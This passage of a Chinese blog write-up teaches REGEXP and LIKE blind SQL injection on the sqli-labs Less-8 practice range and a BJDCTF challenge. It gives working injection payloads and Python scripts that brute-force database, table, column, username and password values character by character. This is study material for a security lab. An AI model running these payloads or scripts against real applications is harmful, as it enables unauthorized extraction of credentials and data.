cloumn1 = <span class="hljs-string">"' or (select column_name from information_schema.columns where table_name=\"users\" and table_schema=database() limit 1,1) regexp '^{}'--+"</span>
data1 = <span class="hljs-string">"' or (select username from users limit 0,1) regexp '^{}'--+"</span>

payload = database1
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    name = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):
        char = <span class="hljs-string">''</span>
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
            payloads = payload.<span class="hljs-built_in">format</span>(name+j)
            urls = url+payloads
            r = requests.get(urls)
            <span class="hljs-keyword">if</span> <span class="hljs-string">"You are in"</span> <span class="hljs-keyword">in</span> r.text:
                name += j
                <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">''</span>)
                char = j
                <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">if</span> char ==<span class="hljs-string">'#'</span>:
            <span class="hljs-keyword">break</span></code></pre>
<h2 id="like注入分析">LIKE注入分析</h2>
<p><strong>like匹配</strong></p>
<p>百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线<code>_</code>通配符允许匹配任何单个字符。</p>
<h3 id="1-基本注入">1、基本注入</h3>
<p><strong>1.<code>like 's%'</code>判断第一个字符是否为s</strong></p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() <span class="hljs-keyword">like</span> <span class="hljs-string">'s%'</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
<p><strong>2.<code>like 'se%'</code>判断前面两个字符串是否为se</strong></p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() <span class="hljs-keyword">like</span> <span class="hljs-string">'se%'</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
<p><strong>3.<code>like '%se%'</code> 判断是否包含se两个字符串</strong>  --不过测试下来发现待测字符的开头一定要为正确的，否则页面一直返回0，也就是无法匹配类似<code>%ecu%</code>这类字符</p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() <span class="hljs-keyword">like</span> <span class="hljs-string">'%se%'</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
<p>4.<code>like '_____'</code>判断是否为5个字符</p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() <span class="hljs-keyword">like</span> <span class="hljs-string">'_____'</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
<p>5.<code>like 's____'</code> 判断第一个字符是否为s</p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() <span class="hljs-keyword">like</span> <span class="hljs-string">'s____'</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215210444287.png" alt="image-20231215210444287"></p>
<h3 id="2-like盲注">2、LIKE盲注</h3>
<p>依旧在sqli-labs靶场Less-8关进行测试</p>
<p><strong>1.判断数据库长度</strong><br>
可用length()函数，也可用<code>_</code>，如：</p>
<pre><code class="hljs sql"><span class="hljs-string">' or database() like '</span>________<span class="hljs-string">'--+</span></code></pre>
<p><strong>2.判断数据库名</strong></p>
<pre><code class="hljs sql"><span class="hljs-string">' or database() like '</span>s<span class="hljs-operator">%</span><span class="hljs-string">'--+</span>
<span class="hljs-string">也可用</span>
<span class="hljs-string">'</span> <span class="hljs-keyword">or</span> database() <span class="hljs-keyword">like</span> <span class="hljs-string">'s_______'</span><span class="hljs-comment">--+</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215210703023.png" alt="image-20231215210703023"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215210719431.png" alt="image-20231215210719431"></p>
<p>说明数据库名的第一个字符是s。数据表、字段、数据类似，把REGEXP盲注脚本改一下，于是成了LIKE盲注脚本：</p>
<pre><code class="hljs sql">import requests
import string

strs <span class="hljs-operator">=</span> string.printable
url <span class="hljs-operator">=</span> "http://x.x.x.x:8001/Less-8/index.php?id="

database1 <span class="hljs-operator">=</span> "' or database() like '{}%'--+"
table1 <span class="hljs-operator">=</span> "' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) like '{}%'--+"
cloumn1 <span class="hljs-operator">=</span> "' or (select column_name from information_schema.columns where table_name=\"users\" and table_schema=database() limit 1,1) like '{}%'--+"
data1 <span class="hljs-operator">=</span> "' or (select username from users limit 0,1) like '{}%'--+"

payload <span class="hljs-operator">=</span> database1
if __name__ <span class="hljs-operator">=</span><span class="hljs-operator">=</span> "__main__":
    name <span class="hljs-operator">=</span> <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):
        <span class="hljs-type">char</span> <span class="hljs-operator">=</span> <span class="hljs-string">''</span>
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
            payloads <span class="hljs-operator">=</span> payload.format(name<span class="hljs-operator">+</span>j)
            urls <span class="hljs-operator">=</span> url<span class="hljs-operator">+</span>payloads
            r <span class="hljs-operator">=</span> requests.get(urls)
            if "You are in" <span class="hljs-keyword">in</span> r.text:
                name <span class="hljs-operator">+</span><span class="hljs-operator">=</span> j
                print(j,<span class="hljs-keyword">end</span><span class="hljs-operator">=</span><span class="hljs-string">''</span>)
                <span class="hljs-type">char</span> <span class="hljs-operator">=</span> j
                break
        if <span class="hljs-type">char</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-string">'#'</span>:
            break</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215210857723.png" alt="image-20231215210857723"></p>
<h3 id="3-regexp注入实战">3、REGEXP注入实战</h3>
<h4 id="bjdctf-2nd-简单注入">BJDCTF 2nd 简单注入</h4>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215213109014.png" alt="image-20231215213109014"></p>
<p>发现提示</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215213135245.png" alt="image-20231215213135245"></p>
<p>这里给出了sql语句</p>
<pre><code class="hljs sql"><span class="hljs-keyword">Only</span> u input the correct password <span class="hljs-keyword">then</span> u can <span class="hljs-keyword">get</span> the flag
<span class="hljs-keyword">and</span> p3rh4ps wants a girl friend.

<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">'$_POST["username"]'</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">'$_POST["password"]'</span>;</code></pre>
<p>很明显又是相同的套路，我们进行如下赋值：</p>
<pre><code class="hljs sql">username<span class="hljs-operator">=</span>haha\
password<span class="hljs-operator">=</span><span class="hljs-string">'or 1#'</span>

<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">'(haha\'</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">')or 1#'</span>; #括号只是一个提示作用</code></pre>
<p>简单fuzz一下看一下过滤情况：</p>
<pre><code class="hljs plaintext">过滤的有：select、union、'、=、like等等</code></pre>
<p>但是没过滤regexp</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215213832727.png" alt="image-20231215213832727"></p>
<p>如上图发现页面有变化，接下来进一步测试</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215214058299.png" alt="image-20231215214058299"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215214043397.png" alt="image-20231215214043397"></p>
<p>发现页面回显不一致，但始终只有这两条信息，这意味着我们需要进行盲注了，直接上脚本，这里我先尝试自己写一番</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

<span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:
        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
    result = result.replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + result


strs = string.ascii_letters + string.digits
url = <span class="hljs-string">"http://f973c801-88f4-44ee-9a5c-ec1911041314.node4.buuoj.cn:81/"</span>
payload = <span class="hljs-string">'or password regexp binary {}#'</span>
headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
}

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    name = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
            passwd = str2hex(<span class="hljs-string">'^'</span> + name + j)
            payloads = payload.<span class="hljs-built_in">format</span>(passwd)
            data = {
                <span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\\'</span>,
                <span class="hljs-string">'password'</span>: payloads
            }
            r = requests.post(url, data=data,headers=headers)
            <span class="hljs-keyword">if</span> <span class="hljs-string">"BJD needs"</span> <span class="hljs-keyword">in</span> r.text:
                name += j
                <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">''</span>)
                <span class="hljs-keyword">break</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215215446707.png" alt="image-20231215215446707"></p>
<p>成功得到密码，我们登录即可得到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215215519726.png" alt="image-20231215215519726"></p>
<h1 id="0x05-后言">0x05 后言</h1>
<p>本次对于报错注入的学习有些许深刻，日后会随缘更新补充本文，希望可以对报错注入有一个完全的掌握。</p>
<h1 id="0x06-参考文章">0x06 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ssslq/article/details/129285751">SQL报错注入（下）</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9849#toc-3">如何使用 MySQL exp() 函数进行 Sql 注入</a></p>
<p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2015/11/19/sql-error/#more">SQL 显错注入</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55793759/article/details/127078074">2021-虎符网络安全赛道-hatenum | exp()函数与正则过滤</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.z3ratu1.top/%5BHFCTF2021%5Dhatenum.html">[HFCTF2021]hatenum</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8003#toc-7">REGEXP注入与LIKE注入学习笔记</a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/12/19/chang-jian-shen-tou-ce-shi-liu-cheng/">常见渗透测试流程</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/12/14/pentesterlab-xi-lie/">PentesterLab刷题记录</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-rand%E5%92%8Corder-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">0x02 rand和order by报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#floor%E5%87%BD%E6%95%B0"><span class="toc-text">Floor（）函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-exp%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">0x03 EXP函数报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="toc-text">注出数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#insert%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5"><span class="toc-text">Insert位置注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#update%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5"><span class="toc-text">Update位置注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E7%9B%B2%E6%B3%A8"><span class="toc-text">exp() 函数进行盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2021-%E8%99%8E%E7%AC%A6%E6%9D%AF-ctf-finalweb-hatenum"><span class="toc-text">2021 虎符杯 CTF Finalweb Hatenum</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-regexp%E4%B8%8Elike%E6%B3%A8%E5%85%A5"><span class="toc-text">0x04 REGEXP与LIKE注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#regexp%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90"><span class="toc-text">REGEXP注入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">1、基本注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-regexp%E7%9B%B2%E6%B3%A8"><span class="toc-text">2、REGEXP盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#like%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90"><span class="toc-text">LIKE注入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">1、基本注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-like%E7%9B%B2%E6%B3%A8"><span class="toc-text">2、LIKE盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-regexp%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98"><span class="toc-text">3、REGEXP注入实战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bjdctf-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5"><span class="toc-text">BJDCTF 2nd 简单注入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%90%8E%E8%A8%80"><span class="toc-text">0x05 后言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x06 参考文章</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
